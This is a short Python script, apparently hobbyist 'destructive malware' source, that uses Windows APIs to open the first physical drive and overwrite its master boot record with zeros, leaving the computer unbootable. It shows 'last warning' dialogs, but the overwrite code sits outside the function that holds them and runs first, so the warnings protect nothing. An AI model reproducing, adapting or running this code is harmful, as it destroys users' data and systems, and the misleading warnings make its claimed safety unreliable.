from win32gui import *
from win32ui import *
from win32con import *
from win32file import *
import time

def main():
    if MessageBox("WARNING! The software you just executed is considered MALWARE and will make your computer unusable. This warning is here to protect you from destroying your computer.", "WARNING!", MB_ICONWARNING | MB_YESNO) == 7: # no
        return
    if MessageBox("If you read the previous warning and have a virtual machine ready, up and running, like Windows Sandbox, VirtualBox or VMware Player, or VMware Workstation is all safe enviroments to run this. THIS IS THE LAST WARNING BEFORE RUNNING.", "Warning, AGAIN!", MB_ICONWARNING | MB_YESNO) == 7: # no
        return
# starts overwriting mbr
hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
CloseHandle(hDevice) # Close the handle to our Physical Drive!

MessageBox("Your MBR is overwritten!", "Oh No!", MB_ICONWARNING | MB_OK)

main()
